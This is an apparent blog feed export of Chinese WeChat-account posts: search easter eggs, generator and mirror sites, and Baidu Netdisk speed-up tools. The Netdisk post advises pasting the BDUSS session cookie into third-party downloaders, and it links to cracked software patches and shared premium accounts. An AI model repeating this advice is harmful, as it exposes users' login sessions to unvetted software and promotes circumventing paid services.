http://a.topurl.cn/future/#/more 如何解决反调试困扰https://github.com/546669204/fuck-debugger-extensions/blob/master/README.zh-CN.md请领取你的2019微信朋友圈年终总结！https://mp.weixin.qq.com/s/zzNJk77bW7RIkWgu8IcvDA b站个人年度报告话题https://t.bilibili.com/topic/name/%E5%B9%B4%E5%BA%A6%E6%8A%A5%E5%91%8A/feed腾讯云https://cloud.tencent.com/developer/timemachine2019/31666df46623a1e823149313e5dc7dd752pojie https://www.52pojie.cn/thread-1090258-1-1.html喜马拉雅2019播客之声https://www.ximalaya.com/toutiao/31908470/电影最TOP 143: 2019年度十大院线引进佳片盘点https://www.bilibili.com/video/av83506596重磅推出：2019中国开源年度报告 https://mp.weixin.qq.com/s/IE5MLkICFZfBrY1UEu6hdAhttps://kaiyuanshe.cn/2019-China-Open-Source-Report/ 写了一个发微博用漫画一键自动拼长图脚本，放到图片文件夹，直接运行即可。https://github.com/jqk4388/long-pic-for-weibo学习linux命令，看这篇2w多字的命令详解就够了 https://mp.weixin.qq.com/s/nMTsD2y_drV971RxdE1a5ghttps://github.com/midou-tech/articles/tree/master/docs/linux对 GitHubDaily 2019 年微博所分享的项目进行复盘分类整理，方便大家查找以往分享过的内容。 https://github.com/GitHubDaily/GitHubDaily谷歌镜像 https://wangchujiang.com/google/ https://github.com/jaywcjlove/google 《程序员修炼之路》作者将自己作为一个过来人，总结了自己程序员修炼之路的经验，以及给后辈的一些建议，分享给初入门的程序员同学。 ​​​​https://github.com/Snailclimb/programmer-advancement 自动识别验证码，本地 API，无须搭环境，一键开启！ 12306、sougou、腾讯、微博 等验证码识别https://github.com/wkunzhihttps://github.com/wkunzhi/Spider-Tools 4 行代码开发新闻网站通用爬虫 pip install gnehttps://cn.v2ex.com/t/634209#reply6 https://generalnewsextractor.readthedocs.io/2019 年 GitHub 报告 https://github.com/guanpengchn/github-annual-report吾爱破解论坛2019年优秀、精华TOP榜 https://www.52pojie.cn/thread-1090258-1-1.html我是一个explorer的线程 https://mp.weixin.qq.com/s?__biz=MzAwMjc3NDQ1Mw==&amp;mid=2247483942&amp;idx=1&amp;sn=6c67b2d735367d6b0876756cc5e81c12&amp;chksm=9ac406fcadb38fead95887a0f0288cf83f6a5cd683d77493724f23f84cc99efba70a92972870&amp;scene=21#wechat_redirect新鲜程序员相声出炉—-我要去培训 https://mp.weixin.qq.com/s/fjeZerNPY1QHY6JgQ5QApg https://github.com/koolob/programmer-crosstalk公众号20万粉丝 https://mp.weixin.qq.com/s/n5FLmtZyWUscAPzyVOTIIASegmentFault 思否 2019年度 Top Writer 榜单 https://segmentfault.com/a/1190000021420277分享一份收集整理了程序员简历常用例句集合。https://github.com/resumejob/awesome-resume你的 2019 年 GitHub 报告还未领取！ https://github.com/guanpengchn/github-annual-report https://githubreport.mdnice.com/ https://resume.mdnice.com/ https://imgkr.com/#upload刷题学习，画解知识 https://draw.mdnice.com/吾爱破解论坛2019年原创区TOP榜 https://www.52pojie.cn/thread-1091297-1-1.html]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有意思的谷歌/百度搜索彩蛋]]></title>
    <url>%2F2020%2F01%2F14%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E8%B0%B7%E6%AD%8C-%E7%99%BE%E5%BA%A6%E6%90%9C%E7%B4%A2%E5%BD%A9%E8%9B%8B%2F</url>
    <content type="text"><![CDATA[苏生不惑第 87 篇原创文章 我平常使用最多的网站就是谷歌了，所谓万事不决找谷歌，关于谷歌之前也写过 那些你可能不知道的搜索奇技淫巧 那些在国内还能使用的谷歌产品 除了常用的搜索，谷歌和百度其实还有很多关键词彩蛋， 下面整理部分有意思的关键词搜索彩蛋，摸鱼的时候可以玩玩。 维基百科上还整理了一份 Google玩笑和复活节彩蛋列表https://zh.wikipedia.org/wiki/Google%E7%8E%A9%E7%AC%91%E5%92%8C%E5%A4%8D%E6%B4%BB%E8%8A%82%E5%BD%A9%E8%9B%8B%E5%88%97%E8%A1%A8 动画效果搜索 z or r twice页面会360°旋转搜索结果 对应百度搜索 翻转效果 其他类似的词还有 askew（倾斜效果） 百度也有很多这样的关键词，比如 摇一摇， 翻转， 黑洞 ，表白，这个之前写过听说你想 520 表白 设置一个密码（比如20196699），然后让对方搜索解蜜20196699 朗读英文搜索pronounce love,搜索结果提供美式和英式两种发音，还可以调整语速。 宇宙的终极答案搜索 Answer to life, the universe and everything结果是42 为什么是42呢？有人说这几个字符正好42个，不过这其实是英国作家道格拉斯·亚当斯所写的系列科幻小说《银河系漫游指南》里的一个数。https://zh.wikipedia.org/wiki/%E7%94%9F%E5%91%BD%E3%80%81%E5%AE%87%E5%AE%99%E4%BB%A5%E5%8F%8A%E4%BB%BB%E4%BD%95%E4%BA%8B%E6%83%85%E7%9A%84%E7%B5%82%E6%A5%B5%E7%AD%94%E6%A1%88 灭霸搜索 灭霸 页面右侧有一个嵌有宝石的手套 点击这个手套，就会有一个打响指的小动画 ，然后页面会消失部分搜索结果。 计算器比如搜索 pi 搜索1.2+(sqrt(1-(sqrt(x^2+y^2))^2 + 1 – x^2-y^2) * (sin (10000 * (x*3+y/5+7 ))+1/4)会得到一个复活节蛋的图案。 吃豆人涂鸦游戏搜索 pacman 玩吃豆人涂鸦游戏当然你也可以直接进入 https://www.google.com/doodles/30th-anniversary-of-pac-man 玩 纸牌接龙相信你肯定玩过Windows下的纸牌接龙游戏，现在你可以在谷歌搜索 solitaire直接在线玩。 Google in 1998搜索 Google in 1998 进入1998年的谷歌页面 https://elgoog.im/google1998/再在这里搜索谷歌，完成套娃操作。 超级马里奥兄弟搜索 Super Mario Bros 右侧会出现超级马里奥游戏里的道具问号箱，点击会有金币掉下来的声音。 贪吃蛇搜索 play snake 开始玩贪吃蛇吧。 指尖陀螺搜索 spinner 会出现指尖陀螺游戏。 老友记搜索《老友记》的角色莫妮卡·盖勒，右侧会有个冒泡的小水桶。 Chrome 小恐龙游戏当 Chrome 浏览器没有连上网络，就会出现这个小恐龙，按空格就可以开始游戏了。 当然不用断网输入chrome://dino/也可以玩，有人还将它移植出来一个网站 https://ishare20.net/game/chromedino/如果想作弊玩让它一直跑可以打开控制台执行以下代码123var dino=Runner.prototypedino.gameOver=()=&gt;&#123;&#125;Runner.instance_.setSpeed(233) 还有哪些你知道有意思的彩蛋，欢迎留言。 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2020 春节买火车票攻略和抢票工具分享 用 Markdown 写简历和 PPT 那些你用得上的镜像网站 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 2019 年我在知识星球上都发了些什么 公众号：苏生不惑 其他谷歌搜索15个超有趣的彩蛋你都知道吗 https://zhuanlan.zhihu.com/p/41410213亚马逊官网，查看页面源码，有个鸭子喵喵叫😂https://cn.v2ex.com/t/636125#reply39使用console输出网站logo彩蛋https://juejin.im/post/5dca2e56518825574d2149e5Google 20 周年纪念，来看看些彩蛋吧https://cn.technode.com/post/2018-09-27/googles-20th-anniversary-easter-eggs/玩情怀，还是Google鬼点子多https://www.topys.cn/article/29448.htmltic tac toe 丼字游戏在chrome浏览器的彩蛋游戏里，最高可以达到多少分https://www.zhihu.com/question/37307927Chrome 竟然藏着这么多小游戏 https://www.weibo.com/6205512779/HxYAgqMLl?type=repost]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 年我在知识星球上都发了些什么]]></title>
    <url>%2F2020%2F01%2F10%2F2019-%E5%B9%B4%E6%88%91%E5%9C%A8%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%B8%8A%E9%83%BD%E5%8F%91%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88%2F</url>
    <content type="text"><![CDATA[这是苏生不惑第 86 篇原创文章 关于知识星球之前写过Python 抓取知识星球内容生成词云和 PDF，为什么想到建一个免费的星球，纯粹是爱好，主要想记录些有用的东西，方便自己也方便有需要的人查看，如果你感兴趣也加入进来吧，微信扫码就行。 6月份开始建立的苏生不惑星球目前已经有1300+星友了。 我朋友圈很少发，一方面朋友圈没有网页版，有时候发个图很麻烦，星球这点很方便，使用网页版跟微博一样方便，所以更新频率就高多了，网页版还有人开发了对应的Chrome插件那些我常用的 Chrome 扩展。 目前已发布845个主题，粉丝1380。网页版虽然使用方便，但没有消息通知，还是推荐使用APP，APP上搜索内容也方便。而且所有内容我都加好了标签，点击对应的标签即可查看标签下的内容。 一晃2019年过去了，正好整理下过去一年我在星球上都发了些什么，可惜星球没有像支付宝/网易/b站那样的年度数据报告，所以只好用Python来抓取了。 继续使用之前的脚本 生成的词云图上面突出的几个词微博/互联网/工具是标签，去掉标签后，效果比较粗糙 精华主题有68个，导出的PDF有15MB 完整版PDF有114MB，包含从6月到今天的所有数据，所以有点大。 如果你想看这份星球的PDF，在公众号内回复 星球 获取。 链接: https://pan.baidu.com/s/1u70BGIU8krZddk95FElqFw 提取码: mxk3 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2020 春节买火车票攻略和抢票工具分享 用 Markdown 写简历和 PPT 那些你用得上的镜像网站 2019 年公众号 苏生不惑 近百篇原创文章整理 2019年11月最新使用油猴加速百度网盘下载方法 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 年公众号 苏生不惑 近百篇原创文章整理]]></title>
    <url>%2F2020%2F01%2F07%2F2019-%E5%B9%B4%E5%85%AC%E4%BC%97%E5%8F%B7-%E8%8B%8F%E7%94%9F%E4%B8%8D%E6%83%91-%E8%BF%91%E7%99%BE%E7%AF%87%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[这是苏生不惑第 85 篇原创文章 不知不觉从5月份开始更新公众号文章，至今已有近100篇原创文章了，也不知道自己怎么坚持下来的。 根据壹伴助手 你的2019年公众号年报已生成 统计结果显示有78篇原创，因为2018年还零星写了几篇。 其中转载和其他部分主要是跟朋友公众号的互推和广告文（比率很低了），公众号偶尔有广告，也请大家理解，人都是要吃饭的，但我不会发垃圾广告，Python广告文什么的大家可能也看多了，帮忙点击下文章就行，先谢谢大家了。 目前公众号由我一人维护，每周固定更新2-3篇原创文章，说实话频率有点低，因为平时上班也没时间，只有周末的时候写，然后分段发，目前是固定早上8点20发文。 其实要写好一篇文章真的很费时间，比如之前那篇反响不错的 2019年11月最新使用油猴加速百度网盘下载方法，从下载软件到安装插件，测试效果，截图，排版，校对，花了几个小时，可以想象那些坚持日更的原创博主有多努力。 有人提过我的公众号文章排版不怎么好看，我是用markdown来写的，这里非常感谢mdnice排版工具，之前我也写过我是如何用 Markdown 写公众号文章的，markdown让你专心写作不用过多考虑排版，当然带来的问题就是比较单一，不够炫，目前个人精力有限，没更好的改进方法，还请理解。 文章多了，翻历史记录也不方便，所以这里做个整理，方便大家搜索查看，建议你收藏本文。 奇技淫巧这个系列写了9篇了，之后还会更新。 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的知乎奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的 bilibili 奇技淫巧 微信关于微信的一些实用技巧。 那些你可能不知道的微信奇技淫巧 微信好友头像拼图 如何发一条空白的朋友圈 如何在电脑上登陆多个微信 朋友圈点赞生成器 我是如何用 Markdown 写公众号文章的 想看的公众号文章被删了怎么办？ PythonPython是个很好用的脚本语言。 Python 文档生成器 mkdocs 比 man 更强悍的命令行工具 cheat 命令行录制工具 asciinema Pyhon 爬虫框架 looter Python 抓取知识星球内容生成词云和 PDF 各种数据库命令行工具 mycli litecli mssql-cli pgcli 不会写Python代码如何抓取豆瓣电影 Top 250 Python 词云分析周杰伦新歌《说好不哭》 ChromeChrome浏览器搭配扩展更好用。 那些我常用的 Chrome 扩展 那些我常用的 Chrome 扩展（二） 那些我常用的 Chrome 扩展（三） 那些实用的 Chrome 扩展神器 那些实用的 Chrome 扩展神器（二） Chrome 浏览器扩展神器油猴 Chrome 浏览器扩展神器暴力猴 如何用 Chrome 扩展备份你的 QQ 空间相册 工具工欲善其事，必先利其器，这些工具能更好的帮助你。 ffmpeg 将视频转GIF 5 分钟使用 hugo 搭建一个自己的博客 ppt 神器 reveal 那些你可能不知道的 ocr 图片文字识别工具 那些你可能不知道的 PDF 工具 那些你可能用得上的简历写作工具 那些你可能不知道的百度文库/网盘快速下载工具 那些你可能不知道的文件分享工具 如何下载优酷 m3u8 格式的视频文件？ 有了内网穿透神器 ngrok ，个人电脑也能做服务器 用 Markdown 写简历和 PPT 那些你可能需要的图片处理工具 如何清除手机拍照的图片 exif 防止泄露你的隐私 2020 春节买火车票攻略和抢票工具分享 那些可多人协作编辑的在线文档工具 百度网盘2019 年 12 月最新加速百度网盘下载方法 2019年11月最新使用油猴加速百度网盘下载方法 那些你可能不知道的百度文库/网盘快速下载工具 没有提取码怎么获取百度网盘资源？ 网站收集一些有用的网站。 那些有趣的网站 那些有意思的网站 那些你用得上的镜像网站 比谷歌更有意思的知识提取搜索引擎 magi 免费在线听周杰伦歌曲 那些好玩的生成器网站 周末推荐几个好用的免费在线看电影网站 如何快速找到电子书《明朝那些事儿》？ 那些除百度以外你可能不知道的小众搜索引擎 有意思的举牌告白小人 怕被发垃圾邮件？用临时邮箱来注册账号 跟随时光机回到过去看看 2005 年的百度/腾讯/淘宝/谷歌 上班摸鱼好去处 那些你可能不知道的百度产品 那些在国内还能使用的谷歌产品 那些你可能不知道的腾讯产品 生活2019 双十一京东全民养红包攻略分享 上班工作压力太大?来玩个游戏解压下 听说你想 520 表白 如何提取公积金 9 天到账 如何在豆瓣租房小组快速找到满意的房子 10%+10% 不等于 0.2？ 我的新浪工作日常 历史上消失的那 10 天去哪了？ 表白新姿势 双十一防虚假促销套路，先查询下商品历史价格 那些我关注的 b 站 up 主 那些我常听的中文播客节目 推荐文章目前阅读量最高分享最多的文章是这篇 如何发一条空白的朋友圈，要不你也来发条空白朋友圈装逼下吧。 其次是这几篇。如何在豆瓣租房小组快速找到满意的房子 那些你可能不知道的 bilibili 奇技淫巧 ，那些你可能不知道的视频下载奇技淫巧 周末推荐几个好用的免费在线看电影网站 那些在国内还能使用的谷歌产品 知识星球最后推荐下我的知识星球，目前星友1200+人，有兴趣的小伙伴免费加入我的星球吧，每天更新一些有意思的内容，我几乎把它当微博用了。 还有几个小时 2019 年都要过去了，你会怀念它吗？文末评论留下你的2019年总结或是2020年计划（明年这时候来看看），点赞数前20每人6.6元现金红包，截止时间1月1日20点。 中奖结果 公众号 苏生不惑 其他2019年马上就要过去了，即将跨入2020年，给大家发个福利。写技术博客那点事https://learnku.com/articles/38794新榜的公众号词云 https://data.newrank.cn/wordCloud.html无套路，公众号 苏生不惑 抽奖送现金红包https://mp.weixin.qq.com/s/1yAoLgsaPolKvrM6ZIzxvA运营公众号一个月，我开通了流量主 https://mp.weixin.qq.com/s/TDiREnaLeRt_94LbftmH3w如何发朋友圈九宫格图片https://mp.weixin.qq.com/s/i-5zXOQuwVZbwA4tbK4pNQ]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些好玩的生成器网站]]></title>
    <url>%2F2019%2F12%2F26%2F%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84%E7%94%9F%E6%88%90%E5%99%A8%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[2019 年时间不多了，还有6天就彻底告别2019进入2020了。 这张图片通过网站 https://c.yonghuigj.com/cx3/2088/ 生成的，是不很应景，下面整理几个好玩的生成器网站。 Logo 生成器一个简单的 Logo 生成器，可以让你快速制作 Pornhub、YouTube 风格的 Logo https://www.zerobbs.net/pornhub/生成一个我公众号名字的logo 词云生成器关于词云之前写过 Python 词云分析周杰伦新歌《说好不哭》 ，不用代码也可以生成词云https://www.weiciyun.com/u/create#/?k=k4jj4mm4导入周杰伦新歌《我是如此相信》的歌词 https://y.qq.com/n/yqq/song/001PLl3C4gPSCI.html?ADTAG=baiduald&amp;play=1生成效果如下，看词云就知道周董对老婆是真爱。 书法生成器https://www.shufazi.cn/以我的公众号名称 苏生不惑 生成一个，还挺好看的。 临时邮箱生成器注册小网站怕垃圾邮件不想用真实邮箱，用个临时邮箱https://bccto.me/注册吧。比如注册一个sushengbuhuo@bccto.me，长一点的有24小时邮箱http://24mail.chacuo.net/ 藏头诗在线生成器所谓藏头诗就是每句的第一个字连起来读，可以传达作者的某种特有的思想。https://cts.chazhi.net/ ，比如我要暴富。1234我虽有田里要使操履笃暴戾日以滋富橐不肯暴 沙雕网文生成器之前有过狗屁不通文章生成器https://suulnnka.github.io/BullshitGenerator/index.html 现在沙雕网文也有了 http://wb.newbfun.com/xsscq.html生成一篇杨过和小龙女的沙雕网文《霸道的总裁霸道的我》。 人脸生成器https://thispersondoesnotexist.com/ 这个网站每次刷新重新生成一张人脸 。 类似的还有https://thisairbnbdoesnotexist.com/ 动漫生成器https://www.thiswaifudoesnotexist.net/ 猫生成器https://thiscatdoesnotexist.com/网红脸生成器 https://www.ctolib.com/a312863063-seeprettyface-generator-wanghong.html https://github.com/a312863063/generators-with-stylegan2 http://www.seeprettyface.com/https://github.com/a312863063/seeprettyface-generator-wanghong 成语接龙查询器https://www.jiuwa.net/chengyu/jielong/ 每点击一个字会生成以这个字开头的成语可以连续几十个成语。 需要我帮你百度么https://lmbtfy.cn/ 遇见伸手党，这个最合适了，输入 周杰伦新歌 生成一个链接 https://lmbtfy.cn/s/tXk9rDZ9KC把这个链接发给他好了（会自动跳转百度），类似还有谷歌 http://lmgtfy.com/ ， 意思是 Let Me Google That For You 为所欲为表情包生成器你别以为有钱就能为所欲为， 抱歉，有钱是真的能为所欲为的。 你在群里可能看过这个表情包 https://eleflea.coding.me/，来这里自己做一个吧，还有王境泽和切格瓦拉的表情包。 诺基亚短信生成器https://zzkia.noddl.me:8020/ 用诺基亚短信来怀旧一把，这个网站还是开源的 https://github.com/dcalsky/zzkia提取祝大家2020新年快乐。 举牌告白小人生成器举牌小人来自一个台湾插画家设计，http://upuptoyou.com/ 提供生成这种图片服务。如果国外的网站比较慢，可以使用国内的 http://1.hus.tcapps.twocola.com/ ，这个用来告白也不错。 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2020 春节买火车票攻略和抢票工具分享 用 Markdown 写简历和 PPT 那些你用得上的镜像网站 比谷歌更有意思的知识提取搜索引擎 magi 2019年11月最新使用油猴加速百度网盘下载方法 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 年 12 月最新加速百度网盘下载方法]]></title>
    <url>%2F2019%2F12%2F26%2F2019-%E5%B9%B4-12-%E6%9C%88%E6%9C%80%E6%96%B0%E5%8A%A0%E9%80%9F%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[关于百度网盘之前已经写过 2019年11月最新使用油猴加速百度网盘下载方法，但还是有小伙伴反馈有时候下载失败（我自己没有碰到，今天还试了，不过说实话idm这个方法有点麻烦）。 而且idm没有mac版，有些小伙伴没法用，不过最近又发现一个下载百度网盘工具 baidupcshttps://github.com/liuzhuoling2011/baidupcs-web/releases，这个支持windows，mac和Linux 系统，如果下载慢的话在公众号回复 百度网盘 获取软件 。 baidupcs-web下载软件后Windows下直接双击BaiduPCS-Go.exe ，这时候浏览器会打开 http://localhost:5299/#/login 登录这里可以用你的百度账号和秘密登录，不过我还是推荐用BDUSS登录， 这个是cookie里的值，登录百度网盘后F12打开控制台查看application中的cookie ，复制BDUSS后面的值。复制到这里直接就能登录了。登录成功后会列出你网盘里的文件，跟登录百度网盘一样，而且还支持搜索。这里选择一个我的知识星球生成的PDF文件下载。 可以看到速度还挺快。不过速度还是没有用idm快，可能跟我的网速有关，大家可以自己试试。下载的知识星球PDF文件内容。 最后欢迎加入我的免费星球，几乎每天更新有意思的内容。 相比百度网盘的客户端还是快一点的。除了BaiduPCS还有个类似的客户端软件亿寻也推荐下。 亿寻这个软件同样在公众号回复 百度网盘获取。也使用cookie来登录，跟上面的 BaiduPCS一样复制BDUSS的cookie值。 搜索要下载的文件 知识星球_苏生不惑.pdf 右键下载下载速度可以达到1MB一会就下载完了。 除了下载自己网盘的文件，还可以下载别人分享的文件，如果有提取码需要输入。 有了idm和上面的BaiduPCS 及亿寻，下载百度网盘的文件不用担心慢了，如果有问题在文章下留言。 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2020 春节买火车票攻略和抢票工具分享 用 Markdown 写简历和 PPT 那些你用得上的镜像网站 比谷歌更有意思的知识提取搜索引擎 magi 公众号：苏生不惑 其他亿寻 百度网盘不限速下载 https://www.52pojie.cn/thread-1065014-1-1.html百度网盘不限速 ——-亿寻 https://www.bilibili.com/read/cv4129481进入主页下载https://github.com/0-01/0/blob/master/1 或者直接打开https://www.lanzous.com/b00n7nu4d下载使用IDM不限速下载百度网盘文件https://www.52pojie.cn/thread-1066396-1-1.html配合aria2使用油猴 https://greasyfork.org/zh-CN/scripts/390707-aria2%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8Baria2的web-ui（管理界面）AriaNg http://ariang.mayswind.net/latest/百度网盘Aria2下载教程https://www.52pojie.cn/thread-1064343-1-1.html百度云/BT/磁力高速下载方法+一款Aria2本地启动器https://www.52pojie.cn/thread-1055867-1-1.htmlaria2的使用方法https://www.bilibili.com/video/av76045138Motrix 支持主流的 HTTP、FTP、BT及磁链下载，配合 Chrome 插件，Motrix 也可以支持百度网盘文件的下载。 https://motrix.app/zh-CN/面对不稳定的百度网盘离线下载，这些备用方案可以帮你应急https://sspai.com/post/51855懒盘搜索http://t.lzpan.com/下载 xdown https://xdown.org/ 百度网盘下载助手Pandownload倒下了，还有它，又一款百度云下载神器，10M/s https://hoxis.github.io/baidupcs-web.html暗网 https://ssrshare.github.io/百度网盘,蓝奏网盘提取码自动填写 https://www.misiyu.cn/article/105.html电影 http://video.misiai.com/高效的百度网盘管理工具 https://www.smbinn.com/category/soft/tools一个小脚本, 关键字: 网盘助手, aria2c, jsonrpc https://cn.v2ex.com/t/627743#reply103个方法解决百度网盘限速 https://www.runningcheese.com/baiduyun 给你一个网址： https://www.baiduyun.wiki/Xdown 配合油猴提供的 aria2 连接 https://github.com/0-01/0/blob/master/1 https://cn.v2ex.com/t/628490#reply33亿寻 https://www.lanzous.com/b00n7nu4d 使用cookie 登录 BDUSShttps://github.com/0-01/0/blob/master/1一个小脚本, 把从WP页面通过wp助手copy的aria2下载链接转换并通过jsonrpc发送到远程或已启动的aria2服务https://github.com/sk1418/link2jsonrpc https://cn.v2ex.com/t/627743#reply0百度账号分享 百度网盘超级会员账号 https://www.52pojie.cn/thread-1073191-1-1.html 一键生成自己网盘所有文件名 https://www.52pojie.cn/thread-1070721-1-1.html下载地址：https://wss1.cn/f/1a2sykmk1hn?52dpmlsc 密码:7342https://pan.baidu.com/s/18J2qQJxhVxX1kV4a6NVX_Q 提取码: cq5tXDM 2018高速下载百度网盘新思路 https://www.52pojie.cn/thread-1070641-1-1.html https://www.lanzous.com/i7wv6wd酷我音乐最新PC版破解收费会员补丁 https://www.52pojie.cn/thread-1070868-1-1.htmlMathtype7.4.4.516安装包分享 支持office2016 office 2019 word ppt附带 若默认安装后加载不到office需要看的安装指导.pdf下载: https://www.lanzous.com/i7x666d 密码: 18av吾爱破解论坛页面精简美化 https://www.52pojie.cn/thread-1070815-1-1.htmlxdm chrome https://chrome.google.com/webstore/detail/xdm-browser-monitor/bgpkelneombgembocnickiddlbebmica3个方法解决百度网盘限速https://www.runningcheese.com/baiduyun常见的异常问题：1、登录时出现网络繁忙的，请稍后重试或次日登录即可正常登录；（次日00:00）2、下载文件时，出现下载失败的，请重试或删除文件，重新下载；3、发现下载速度几十或几百k的，是个人的网络问题，超级会员是不会限速的；4、下载时出现网络异常：①请检查文件是否存在，再重试下载，②重启软件一下；③取消下载，重新下载一次；5、下载时出现限速的：是因为每个账号只有5t流量阈值，当你看到是限速了，就是这个账号已经使用了5t左右，所以被限速了，如觉得慢，请等次日再继续下载。6、下载时出现”下载请求中”时，点全部暂停，再点击开始下载就完美解决。2、下载前，最好修改一下文件保存位置，因为默认是在“C:\Users\你的用户名\Downloads”下面。3、目前北京江苏地区暂不可用。4、如果用户名的方法无法登录，尝试使用手机短信或者手机 APP 扫码登录。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你用得上的镜像网站]]></title>
    <url>%2F2019%2F12%2F19%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E7%94%A8%E5%BE%97%E4%B8%8A%E7%9A%84%E9%95%9C%E5%83%8F%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[国外的某些网站经常打不开或很慢，于是就有了做代理的镜像网站，推荐几个常用的镜像网站，你可能用得上。 谷歌Google镜像就是一个代理访问谷歌的网站，比如 http://ac.scmor.com/ http://scholar.hedasudi.com/ ，自从用谷歌以后搜索效率快多了，建议你看看我之前的总结那些你可能不知道的搜索奇技淫巧，不过镜像只能使用不能登录谷歌账号。 谷歌学术https://gfsoso.99lb.net/ https://cc.gufenxueshu.com/scholar/ https://www.gycc.com/?q=5g 搜索5g的结果对比谷歌学术的结果https://scholar.google.com.hk/scholar?q=5g&amp;hl=zh-CN&amp;as_sdt=0,5 维基百科维基百科的中文版万维百科，不过数据没有官方全 https://www.wanweibaike.com/ https://zh.wikipedia-mirror.org/wiki/Wikipedia:%E9%A6%96%E9%A1%B5维基百科还提供数据下载 https://dumps.wikimedia.org/zhwiki/latest/ GitHubGitHub有时候clone很慢，如果你有代理ip可以 alias gg=&#39;http_proxy=127.0.0.1:1087 https_proxy=127.0.0.1:1087&#39;，然后gg git clone xxx GitHub镜像网站有 https://github.com.cnpmjs.org/ https://git.azurewebsites.net/ 谷歌商店 https://pictureknow.com/#/extension https://www.gugeapps.net/http://www.cnplugins.com/top https://www.crx4chrome.com/ https://www.chromefor.com/ 关于Chrome扩展之前写过那些实用的 Chrome 扩展神器，安装Chrome扩展可以使用镜像商店下载crx文件然后手动安装，不过有些扩展可能没有及时同步。 油管最近李子柒很火，看看她在油管的视频吧，不过这个网站不支持中文搜索。 https://www.biantube.com/watch/xSDMTIe90AY SCI-Hub做科研的人用得着 http://tool.yovisun.com/scihub/另外推荐一个Sci-Hub一键全文下载的Chrome扩展 ，地址 https://chrome.google.com/webstore/detail/auto-sci-hub/nlogbpfgpkffmombiknfdoogphkimmmd npmhttp://npm.taobao.org/ 这是一个完整 npmjs.org 镜像，你可以用此代替官方版本(只读)，同步频率目前为 10分钟 一次以保证尽量与官方服务同步。npm config set registry &quot;https://registry.npm.taobao.org&quot; golang golang.org 打不开，你可以用https://golang.google.cn/dl/或者https://gomirrors.org/ 。 命令行代理有 https://goproxy.io/ https://goproxy.cn/ 命令行执行export GOPROXY=https://goproxy.io composerphp.net 中文镜像 http://php.p2hp.com/阿里云 Composer 全量镜像 https://developer.aliyun.com/composer 可以通过prestissimo composer global require hirak/prestissimo 来管理composer镜像。 pypi清华大学开源软件镜像站 https://mirror.tuna.tsinghua.edu.cn/使用 pip install -i https://pypi.tuna.tsinghua.edu.cn/simple some-package安装Python包 其他本地安装 Go Tour https://learnku.com/golang/wikis/38166国内最强 Chrome 商店镜像 https://pictureknow.com/#/extensionhttps://chrome.zzzmh.cn/index#indexgithub 有 https://github.com.cnpmjs.org/oclip https://git.azurewebsites.net/让我想起 Facebook 有 56 个性别的那个帖子Google镜像/谷歌镜像 https://www.uedbox.com/post/54776/2019年7月谷歌搜索引擎镜像大全 http://tools.bugscaner.com/google/北京交通大学自由与开源软件镜像站 https://mirror.bjtu.edu.cn/google play https://apkcombo.com/zh-cn/修改Hosts临时解决GitHub的raw.githubusercontent.com无法链接的问题https://www.ioiox.com/archives/62.html199.232.4.133 raw.githubusercontent.comhttps://githubusercontent.com.ipaddress.com/raw.githubusercontent.comupx浏览器https://www.jsdelivr.com/?docs=gh如果访问不了 raw.githubusercontent.com，在 hosts 中添加199.232.4.133151.101.228.133 raw.githubusercontent.com151.101.0.133 raw.githubusercontent.com阿里： https://mirrors.aliyun.com/goproxy/ https://gocenter.io/ https://learnku.com/golang/wikis/38122time go get golang.org/x/tour https://tour.golang.org/ https://github.com/golang/tour 推荐阅读: 如何发一条空白的朋友圈 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 2019年11月最新使用油猴加速百度网盘下载方法 用 Markdown 写简历和 PPT 那些有趣的网站 比谷歌更有意思的知识提取搜索引擎 magi 有了内网穿透神器 ngrok ，个人电脑也能做服务器 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[周杰伦新歌《我是如此相信》在线收听，另附网易云音乐下载工具]]></title>
